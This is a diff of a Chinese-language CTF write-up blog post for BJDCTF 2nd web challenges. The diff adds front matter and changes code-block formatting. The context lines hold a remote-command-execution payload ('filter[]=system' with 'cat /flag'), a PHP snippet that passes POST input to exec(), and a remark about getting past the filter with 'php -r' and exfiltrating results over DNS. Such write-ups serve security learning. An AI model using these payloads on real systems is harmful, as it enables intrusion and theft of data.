@@ -1,9 +1,11 @@
 ---
 layout: post
-title: 
-data: 
-categories: 
+title: BJDCTF 2nd Web Writeup
+data: 2020-03-23
+categories: writeups
 tags: 
+ - CTF
+ - writeup
 description: 
 excerpt_separator: <!-- more -->
 ---
@@ -97,7 +99,7 @@ POST：_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
 
 源码删减：
 
-``` php
+{% highlight php linenos %}
 <?php
 error_reporting(0);
 echo "how can i give you source code? .swp?!"."<br>";
@@ -114,7 +116,7 @@ if (!isset($_POST['girl_friend'])) {
         exec($girl);
     }
 }
-```
+{% endhighlight %}
 
 拦截形同虚设，可以用"php -r"执行PHP代码。不过没有回显，需要将结果打到DNS上。
 
